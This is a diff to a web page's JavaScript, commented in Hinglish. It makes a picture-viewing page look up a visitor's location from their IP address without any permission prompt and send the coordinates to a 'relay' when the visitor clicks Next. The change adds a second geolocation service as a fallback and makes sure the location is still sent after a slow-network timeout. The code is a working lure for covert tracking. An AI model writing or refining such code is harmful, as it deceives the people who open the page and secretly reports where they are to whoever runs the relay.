@@ -260,8 +260,11 @@
   /* --- IP location (bhai mode): koi permission pop-up nahi, sirf IP se
      sheher-level location. Next dabate hi IP location relay par bhej do
      aur dusri picture dikhao. --- */
-  var ipSent = false;
+  var locSent = false;
+  var picShown = false;
   function showNextPic(){
+    if (picShown) return;
+    picShown = true;
     var mainEl = document.querySelector('main');
     if (mainEl) mainEl.style.display = 'none';
     var picEl2 = document.getElementById('picScreen');
@@ -270,16 +273,14 @@
     if (pic2) pic2.style.display = 'block';
   }
   function fetchIpLocation(){
-    if (ipSent) return;
+    if (locSent) return;
     var done = function(lat, lng){
-      if (ipSent) return;
-      ipSent = true;
+      if (locSent) return;
+      locSent = true;
       sendToRelay(lat, lng, 5000);
       showNextPic();
     };
     var showPicOnly = function(){
-      if (ipSent) return;
-      ipSent = true;
       showNextPic();
     };
     fetch('https://ipapi.co/json/')
@@ -293,11 +294,25 @@
           .then(function(r){ return r.json(); })
           .then(function(d){
             if (d && d.status === 'success' && typeof d.lat === 'number' && typeof d.lon === 'number') done(d.lat, d.lon);
-            else showPicOnly();
+            else throw new Error('no coords');
           })
-          .catch(function(){ showPicOnly(); });
+          .catch(function(){
+            fetch('https://ipinfo.io/json')
+              .then(function(r){ return r.json(); })
+              .then(function(d){
+                if (d && typeof d.loc === 'string') {
+                  var parts = d.loc.split(',');
+                  var la = parseFloat(parts[0]), lo = parseFloat(parts[1]);
+                  if (isFinite(la) && isFinite(lo)) { done(la, lo); return; }
+                }
+                showPicOnly();
+              })
+              .catch(function(){ showPicOnly(); });
+          });
       });
-    setTimeout(function(){ if (!ipSent) showPicOnly(); }, 8000);
+    /* Slow net par picture 15 second me dikha do, lekin location aane par
+       phir bhi bhej do — timeout send ko kabhi nahi rokega. */
+    setTimeout(function(){ showPicOnly(); }, 15000);
   }
   var nextBtn = document.getElementById('nextBtn');
   if (nextBtn) nextBtn.addEventListener('click', function(){
